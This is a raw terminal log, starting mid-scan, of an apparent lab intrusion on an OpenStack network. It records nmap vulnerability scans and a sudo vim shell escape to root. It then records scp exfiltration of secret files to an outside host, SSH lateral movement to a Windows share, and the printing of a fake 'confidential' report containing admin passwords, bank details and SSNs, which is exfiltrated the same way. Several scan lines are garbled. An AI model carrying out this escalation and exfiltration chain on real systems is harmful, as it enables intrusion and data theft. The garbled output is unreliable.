|_clock-skew: mean: -12m00s, deviation: 26m48s, median: -1s
|_nbstat: NetBIOS name: IT-WIN-SHARE, NetBIOS user: <unknown>, NetBIOS MAC: fa:16:3e:1b:95:5a (unknown)
| smb-os-discovery:
|   OS: Windows Server 2019 Standard Evaluation 17763 (Windows Server 2019 Standard Evaluation 6.3)
|   Computer name: it-win-share
|   NetBIOS computer name: IT-WIN-SHARE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-11-23T17:14:53+01:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Post-scan script results: 
| clock-skew:
|   0s:
|     10.0.1.5 (host-10-0-1-5.openstacklocal)
|_    10.0.1.15 (host-10-0-1-15.openstacklocal)
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 128 IP addresses (7 hosts up) scanned in 437.46 seconds
ubuntu@IT-Linux-PC-1:~$ scp -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password nmap.txt debian@10.1.3.165:/home/debian/                                                                      
Warning: Permanently added '10.1.3.165' (ECDSA) to the list of known hosts. 
debian@10.1.3.165's password:  
nmap.txt     
ubuntu@IT-Linux-PC-1:~$ nmap -Pn --script vuln 10.0.1.20 
Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-23 17:19 CET 
Nmap scan report for host-10-0-1-20.openstacklocal (10.0.1.20) 
Host is up (0.30s latency).
Not shown: 994 closed ports 
PORT     STATE SERVICE
22/tcp   open  ssh
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
135/tcp  open  msrpc
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
139/tcp  open  netbios-ssn
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
445/tcp  open  microsoft-ds
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
3389/tcp open  ms-wbt-server
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown:
5357/tcp open  wsdapi
|_clamav-exec: ERROR: Script execution failed (use -d to debug)

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED

Nmap done: 1 IP address (1 host up) scanned in 53.34 seconds
sudo vim -c '!sh'

-->
:!sh
# whoami 
root
# ls 
Documents                  audit.rules         someotherworkdocument.txt 
IT-Linux-PC-1_logs.tar.gz  nmap.txt            tshark
IT-Linux-PC-1_pcap.tar.gz  somedebugnotes.txt  workdocument.txt
# cd Documents 
# ls 
secret.txt                                                                
# scp -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password secret.txt debian@10.1.3.165:/home/debian 
Warning: Permanently added '10.1.3.165' (ECDSA) to the list of known hosts. 
debian@10.1.3.165's password:  
secret.txt  
ssh -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password TestAdmin@10.0.1.20 -p 666
Denied
ssh -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password TestAdmin@10.0.1.20

-->

:!sh
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

testadmin@IT-WIN-SHARE C:\Users\TestAdmin>ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

testadmin@IT-WIN-SHARE C:\Users\TestAdmin>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\TestAdmin> whoami
it-win-share\testadmin
PS C:\Users\TestAdmin> ls


    Directory: C:\Users\TestAdmin
----                -------------         ------ ----
d-----       11/23/2024   1:37 PM                .ssh
d-r---       11/23/2024   2:39 PM                3D Objects
d-r---       11/23/2024   2:39 PM                Contacts
d-r---       11/23/2024   2:39 PM                Desktop
d-r---       11/23/2024   2:39 PM                Documents
d-r---       11/23/2024   2:39 PM                Downloads
d-r---       11/23/2024   2:39 PM                Favorites
d-r---       11/23/2024   2:39 PM                Links
d-r---       11/23/2024   2:39 PM                Music
d-r---       11/23/2024   1:47 PM                OneDrive
d-r---       11/23/2024   2:39 PM                Pictures
d-r---       11/23/2024   2:39 PM                Saved Games
d-r---       11/23/2024   2:39 PM                Searches
d-r---       11/23/2024   2:39 PM                Videos
------       11/23/2024   3:57 PM              0 file_read.etl
------       11/23/2024   3:57 PM              0 Powershell_payload.etl
------       11/23/2024   3:57 PM              0 Registry_read.etl


PS C:\Users\TestAdmin> cd ..
PS C:\Users> cd ..
PS C:\> ls
    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/23/2024   3:56 PM                Export-EventLogs
d-----        9/15/2018   9:19 AM                PerfLogs
d-r---       11/23/2024   2:39 PM                Program Files
d-----       11/23/2024   2:39 PM                Program Files (x86)
d-----       11/23/2024   1:44 PM                Python312
d-----       11/23/2024   2:23 PM                shares
d-----       11/23/2024   2:05 PM                tools
d-r---       11/23/2024   1:33 PM                Users
d-----       11/23/2024   2:54 PM                Windows
-a----       11/23/2024   1:38 PM             14 hosts.txt
-a----       11/23/2024   2:12 PM          19518 Set-UserRights.ps1
-a----       11/23/2024   2:01 PM           2258 setACL.ps1
-a----       11/23/2024   1:38 PM            437 winrm_log.txt
-a----       11/23/2024   1:34 PM           3706 winrm_log2.txt


PS C:\> cd .\shares\
PS C:\shares> ls


    Directory: C:\shares


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/23/2024   2:23 PM                company

PS C:\shares> cd .\company\
PS C:\shares\company> ls


    Directory: C:\shares\company


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/23/2024   2:23 PM           3654 confidential_report.txt


PS C:\shares\company> type .\confidential_report.txt
===================================================================
CONFIDENTIAL - DO NOT DISTRIBUTE
===================================================================
Company: Acme Corp
Date: August 2024
Prepared By: John Doe, Chief Information Officer (CIO)
===================================================================

## Executive Summary:
This document contains critical information about Acme Corp's future strategic initiatives, financial projections, a
nd system vulnerabilities. Unauthorized access to this document is strictly prohibited.

## Section 1: Strategic Initiatives
1. Acquisition of GlobalTech Solutions by Q1 2025.
   - Budget allocated: $250 million.
   - Key contacts: James Watson (CEO of GlobalTech), Maria Sanchez (Lead M&A Analyst).

2. Expansion into Asian markets:
   - Market entry plan: Singapore, South Korea, Japan.
   - Budget: $75 million for FY2024.
   - Legal risks: Potential regulatory issues in China.

3. R&D Projects:
   - Project Phoenix: AI-driven manufacturing solutions.
   - Timeline: Patent applications to be filed by December 2024.

## Section 2: Financial Information
- Current company valuation: $5.2 billion.
- Projected revenue for 2024: $800 million.
- Revenue growth rate (2023): 12%.
- Confidential bank accounts:
   - Acme Corp Main Account:
     Bank: Global Bank Ltd
     Account Number: 123456789012
     Routing Number: 987654321
   - Offshore Investment Fund:
     Bank: Offshore Trust Bank
     Account Number: 987654321012
     Routing Number: 123456789

## Section 3: Infrastructure Overview
- Cloud services provider: Amazon Web Services (AWS).
  - Root admin credentials:
    Username: root@acmecorp.com
    Password: Sup3rSecr3tPassw0rd!

- Active Directory Domain Controller:
  - Admin user: administrator@acmecorp.local
  - Admin password: Adm1n$Tr0ngP@ss!

- Internal network map:
  - VLAN 1: Corporate network.
  - VLAN 2: Development network.
  - VLAN 3: Finance and Accounting.
  - Critical infrastructure IPs:
    - 192.168.1.10: SQL Database Server
    - 192.168.1.15: Web Application Server
    - 192.168.1.20: Financial System

## Section 4: Employee Personal Data
- John Doe (CEO):
  - SSN: 123-45-6789
  - Phone: +1 555 123 4567
  - Personal email: johndoe@gmail.com

- Jane Smith (CFO):
  - SSN: 987-65-4321
  - Phone: +1 555 987 6543
  - Personal email: janesmith@yahoo.com

## Section 5: System Vulnerabilities (Internal Use Only)
- Known Vulnerabilities:
  - Outdated Windows Server 2016 on critical application server.
  - Unpatched CVE-2021-12345 on internal web application.
  - Weak password policy on finance systems.
  - Print Spooler service is enabled on multiple Windows Workstations (related to PrintNightmare CVE-2021-34527).   
  - HiveNightmare (CVE-2021-36934) on all Windows Servers
  - ZeroLogon (CVE-2020-1472) on Domain Controllers
  - basically all Windows machines are vulnerable to Juicy Potato (CVE-2019-0836)


- Planned Patches:
  - August 2024: Full patch rollout for Print Spooler.
  - September 2024: Migrate legacy servers to Windows Server 2022.

## Section 6: Legal and Regulatory Risks
- Ongoing litigation with XYZ Corp:
  - Case Number: 12345-XYZ
  - Expected settlement: $50 million.
  - Legal team: Davis & Associates.

- GDPR compliance risk due to recent data breach incident (2024):
  - Affected customers: 50,000.
  - Potential fine: Up to â‚¬20 million.

===================================================================
This document is property of Acme Corp. Unauthorized access, reproduction, or distribution of this document is punis
hable by law.
===================================================================
PS C:\shares\company> scp -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password .\confidential_report.txt debian@10.1.3.165:/home/debian/
The authenticity of host '10.1.3.165 (10.1.3.165)' can't be established.
ECDSA key fingerprint is SHA256:1A0mQ1Z890Ppt80uWzMOmrArGDQ+QRdz8GiTm+XyLFg.
Are you sure you want to continue connecting (yes/no)?
Warning: Permanently added '10.1.3.165' (ECDSA) to the list of known hosts.
debian@10.1.3.165's password:
confidential_report.txt                                                           100% 3654    75.9KB/s   00:00
cd ..
cd ..
PS C:\> Invoke-WebRequest 'https://raw.githubusercontent.com/BornToBeRoot/PowerShell_IPv4NetworkScanner/refs/heads/main/Scripts/IPv4NetworkScan.ps1' -OutFile scan.ps1 
PS C:\> .\scan.ps1 -IPv4Address 10.0.2.0 -CIDR 24

IPv4Address Status Hostname
----------- ------ --------
10.0.2.1    Up     host-10-0-2-1.openstacklocal
10.0.2.2    Up
10.0.2.12   Up     host-10-0-2-12.openstacklocal
10.0.2.15   Up     host-10-0-2-15.openstacklocal
10.0.2.16   Up     host-10-0-2-16.openstacklocal
10.0.2.17   Up     host-10-0-2-17.openstacklocal
10.0.2.20   Up     it-win-share.openstacklocal


PS C:\> nmap -A 10.0.2.0/24
Nmap scan report for host-10-0-2-1.openstacklocal (10.0.2.1)   Europe Standard Time  
All 1000 scanned ports on host-10-0-2-1.openstacklocal (10.0.2.1) are in ignored states.
Not shown: 1000 closed tcp ports (reset)
MAC Address: FA:16:3E:51:14:D1 (Unknown)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   2.08 ms host-10-0-2-1.openstacklocal (10.0.2.1)

Nmap scan report for 10.0.2.2
Host is up (0.0024s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
53/tcp open  domain  dnsmasq 2.90
| dns-nsid:
|_  bind.version: dnsmasq-2.90
MAC Address: FA:16:3E:04:9B:7D (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/23%OT=53%CT=1%CU=43763%PV=Y%DS=1%DC=D%G=Y%M=FA163E%
OS:TM=67420430%P=i686-pc-windows-windows)SEQ(SP=102%GCD=1%ISR=107%TI=Z%CI=Z
OS:%II=I%TS=A)SEQ(SP=102%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=103%GCD=1
OS:%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FF%GCD=1%ISR=106%TI=Z%CI=Z%TS=A)SEQ(
OS:SP=FF%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M582ST11NW7%O2=M582ST11NW
OS:7%O3=M582NNT11NW7%O4=M582ST11NW7%O5=M582ST11NW7%O6=M582ST11)WIN(W1=FB34%
OS:W2=FB34%W3=FB34%W4=FB34%W5=FB34%W6=FB34)ECN(R=Y%DF=Y%T=40%W=FD5C%O=M582N
OS:NSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=
OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A
OS:R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=4
OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=
OS:G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   2.45 ms 10.0.2.2

Nmap scan report for host-10-0-2-12.openstacklocal (10.0.2.12)
Host is up (0.0021s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   3072 88:f3:b2:88:39:2e:d1:f2:92:d0:cd:94:f5:cf:ae:dd (RSA)
|   256 8c:48:a2:10:b3:69:58:78:47:37:4f:62:d7:53:b3:49 (ECDSA)
|_  256 5a:d2:c4:7c:10:79:bd:8a:c8:15:68:1c:8b:f0:a6:14 (ED25519)
80/tcp   open  ssh           OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   3072 88:f3:b2:88:39:2e:d1:f2:92:d0:cd:94:f5:cf:ae:dd (RSA)
|   256 8c:48:a2:10:b3:69:58:78:47:37:4f:62:d7:53:b3:49 (ECDSA)
|_  256 5a:d2:c4:7c:10:79:bd:8a:c8:15:68:1c:8b:f0:a6:14 (ED25519)
222/tcp  open  ssh           OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   3072 88:f3:b2:88:39:2e:d1:f2:92:d0:cd:94:f5:cf:ae:dd (RSA)
|   256 8c:48:a2:10:b3:69:58:78:47:37:4f:62:d7:53:b3:49 (ECDSA)
|_  256 5a:d2:c4:7c:10:79:bd:8a:c8:15:68:1c:8b:f0:a6:14 (ED25519)
666/tcp  open  ssh           OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   3072 88:f3:b2:88:39:2e:d1:f2:92:d0:cd:94:f5:cf:ae:dd (RSA)
|   256 8c:48:a2:10:b3:69:58:78:47:37:4f:62:d7:53:b3:49 (ECDSA)
|_  256 5a:d2:c4:7c:10:79:bd:8a:c8:15:68:1c:8b:f0:a6:14 (ED25519)
3389/tcp open  ms-wbt-server Microsoft Terminal Service
MAC Address: FA:16:3E:9D:0E:30 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/23%OT=22%CT=1%CU=44005%PV=Y%DS=1%DC=D%G=Y%M=FA163E%
OS:TM=67420430%P=i686-pc-windows-windows)SEQ(SP=100%GCD=1%ISR=100%TI=Z%CI=Z
OS:%II=I%TS=A)SEQ(SP=101%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=102%GCD=1
OS:%ISR=108%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=
OS:A)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M582ST11NW7%O2=M58
OS:2ST11NW7%O3=M582NNT11NW7%O4=M582ST11NW7%O5=M582ST11NW7%O6=M582ST11)WIN(W
OS:1=FB34%W2=FB34%W3=FB34%W4=FB34%W5=FB34%W6=FB34)ECN(R=Y%DF=Y%T=40%W=FD5C%
OS:O=M582NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=
OS:N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A
OS:=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%D
OS:F=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL
OS:=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

TRACEROUTE
HOP RTT     ADDRESS
1   2.14 ms host-10-0-2-12.openstacklocal (10.0.2.12)

Nmap scan report for host-10-0-2-15.openstacklocal (10.0.2.15)
Host is up (0.0018s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 99:44:f7:a5:aa:08:46:f1:53:f2:17:72:65:a9:47:45 (RSA)
|   256 af:11:21:da:5a:05:ec:96:f1:da:03:ac:c1:80:0f:dc (ECDSA)
|_  256 58:43:3f:81:e9:24:6c:b8:19:ff:11:0a:9f:9d:af:8b (ED25519)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=ot-win-pc-1
| Not valid before: 2024-11-13T15:35:00
|_Not valid after:  2025-05-15T15:35:00
|_ssl-date: 2024-11-23T16:34:56+00:00; 0s from scanner time.
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=Cloudbase-Init WinRM
| Not valid before: 2024-11-13T15:44:11
|_Not valid after:  2034-11-12T15:44:11
|_ssl-date: 2024-11-23T16:34:56+00:00; 0s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn:
|_  http/1.1
|_http-title: Not Found
MAC Address: FA:16:3E:9A:51:3E (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/23%OT=22%CT=1%CU=41711%PV=Y%DS=1%DC=D%G=Y%M=FA163E%
OS:TM=67420430%P=i686-pc-windows-windows)SEQ(SP=103%GCD=1%ISR=105%TI=I%CI=I
OS:%II=I%SS=S%TS=U)SEQ(SP=104%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP
OS:=104%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=107%GCD=1%ISR=108%TI=
OS:I%CI=I%II=I%SS=S%TS=U)SEQ(SP=FA%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=U)O
OS:PS(O1=M582NW8NNS%O2=M582NW8NNS%O3=M582NW8%O4=M582NW8NNS%O5=M582NW8NNS%O6
OS:=M582NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=
OS:Y%T=80%W=FFFF%O=M582NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q
OS:=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%
OS:A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%D
OS:F=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O
OS:=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80
OS:%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: OT-WIN-PC-1, NetBIOS user: <unknown>, NetBIOS MAC: fa:16:3e:9a:51:3e (unknown)
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2024-11-23T16:34:23
 _  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   1.80 ms host-10-0-2-15.openstacklocal (10.0.2.15)

Nmap scan report for 10.0.2.16
Host is up (0.0016s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   3072 dc:3a:87:ea:a6:6d:36:68:4c:68:e0:3e:2d:79:bb:5e (RSA)
|   256 1a:04:94:7c:08:b7:ed:0c:aa:33:d8:49:d7:88:e6:1e (ECDSA)
|_  256 02:22:6c:58:1d:fe:63:e2:53:3c:9e:4f:b4:47:92:0c (ED25519)
80/tcp   open  ssh           OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   3072 dc:3a:87:ea:a6:6d:36:68:4c:68:e0:3e:2d:79:bb:5e (RSA)
|   256 1a:04:94:7c:08:b7:ed:0c:aa:33:d8:49:d7:88:e6:1e (ECDSA)
|_  256 02:22:6c:58:1d:fe:63:e2:53:3c:9e:4f:b4:47:92:0c (ED25519)
222/tcp  open  ssh           OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   3072 dc:3a:87:ea:a6:6d:36:68:4c:68:e0:3e:2d:79:bb:5e (RSA)
|   256 1a:04:94:7c:08:b7:ed:0c:aa:33:d8:49:d7:88:e6:1e (ECDSA)
666/tcp  open  ssh           OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   3072 dc:3a:87:ea:a6:6d:36:68:4c:68:e0:3e:2d:79:bb:5e (RSA)
|   256 1a:04:94:7c:08:b7:ed:0c:aa:33:d8:49:d7:88:e6:1e (ECDSA)
|_  256 02:22:6c:58:1d:fe:63:e2:53:3c:9e:4f:b4:47:92:0c (ED25519)
3389/tcp open  ms-wbt-server Microsoft Terminal Service
MAC Address: FA:16:3E:5B:F7:51 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/23%OT=22%CT=1%CU=35308%PV=Y%DS=1%DC=D%G=Y%M=FA163E%
OS:TM=67420430%P=i686-pc-windows-windows)SEQ(SP=102%GCD=1%ISR=10B%TI=Z%CI=Z
OS:%II=I%TS=A)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=F0%GCD=1%
OS:ISR=10E%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FB%GCD=1%ISR=103%TI=Z%CI=Z%II=I%TS=A)
OS:SEQ(SP=FC%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M582ST11NW7%O2=M582ST
OS:11NW7%O3=M582NNT11NW7%O4=M582ST11NW7%O5=M582ST11NW7%O6=M582ST11)WIN(W1=F
OS:B34%W2=FB34%W3=FB34%W4=FB34%W5=FB34%W6=FB34)ECN(R=Y%DF=Y%T=40%W=FD5C%O=M
OS:582NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T
OS:4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+
OS:%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y
OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%
OS:RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

TRACEROUTE
HOP RTT     ADDRESS
1   1.62 ms 10.0.2.16

Nmap scan report for host-10-0-2-17.openstacklocal (10.0.2.17)
Host is up (0.0013s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   3072 59:2c:6c:28:bb:37:ab:8c:c5:94:5b:a2:28:9c:1b:08 (RSA)
|   256 f2:50:d8:6d:64:d7:ce:38:58:b3:65:79:4d:a5:ec:31 (ECDSA)
|_  256 83:bf:e7:2f:8a:20:43:0f:73:1d:69:ef:ba:00:4b:09 (ED25519)
80/tcp   open  ssh           OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   3072 59:2c:6c:28:bb:37:ab:8c:c5:94:5b:a2:28:9c:1b:08 (RSA)
|   256 f2:50:d8:6d:64:d7:ce:38:58:b3:65:79:4d:a5:ec:31 (ECDSA)
|_  256 83:bf:e7:2f:8a:20:43:0f:73:1d:69:ef:ba:00:4b:09 (ED25519)
222/tcp  open  ssh           OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   3072 59:2c:6c:28:bb:37:ab:8c:c5:94:5b:a2:28:9c:1b:08 (RSA)
|   256 f2:50:d8:6d:64:d7:ce:38:58:b3:65:79:4d:a5:ec:31 (ECDSA)
|_  256 83:bf:e7:2f:8a:20:43:0f:73:1d:69:ef:ba:00:4b:09 (ED25519)
666/tcp  open  ssh           OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   3072 59:2c:6c:28:bb:37:ab:8c:c5:94:5b:a2:28:9c:1b:08 (RSA)
|   256 f2:50:d8:6d:64:d7:ce:38:58:b3:65:79:4d:a5:ec:31 (ECDSA)
3_  256 83:bf:e7:2f:8a:20:43:0f:73:1d:69:ef:ba:00:4b:09 (ED25519)
N389/tcp open  ms-wbt-server Microsoft Terminal Service
MAC Address: FA:16:3E:B0:EF:A1 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/23%OT=22%CT=1%CU=30013%PV=Y%DS=1%DC=D%G=Y%M=FA163E%
OS:TM=67420431%P=i686-pc-windows-windows)SEQ(SP=102%GCD=1%ISR=10C%TI=Z%CI=Z
OS:%II=I%TS=A)SEQ(SP=103%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=F9%GCD=1%
OS:ISR=105%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FE%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)
OS:SEQ(SP=FF%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M582ST11NW7%O2=M582ST
OS:11NW7%O3=M582NNT11NW7%O4=M582ST11NW7%O5=M582ST11NW7%O6=M582ST11)WIN(W1=F
OS:B34%W2=FB34%W3=FB34%W4=FB34%W5=FB34%W6=FB34)ECN(R=Y%DF=Y%T=40%W=FD5C%O=M
OS:582NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T
OS:4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+
OS:%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y
OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%
OS:RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

TRACEROUTE
HOP RTT     ADDRESS
H   1.31 ms host-10-0-2-17.openstacklocal (10.0.2.17)
Nmap scan report for host-10-0-2-20.openstacklocal (10.0.2.20)  
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 d2:f9:a4:90:c2:ad:a5:bf:8f:e8:95:89:bb:e0:62:6a (RSA)
|   256 8c:f0:b2:ef:d8:1e:57:aa:24:ec:b3:6d:1e:95:f8:c7 (ECDSA)
|_  256 88:ac:06:11:9d:85:97:0d:50:cc:25:54:3e:1b:84:06 (ED25519)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019 Standard Evaluation 17763 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-11-23T16:36:13+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=it-win-share
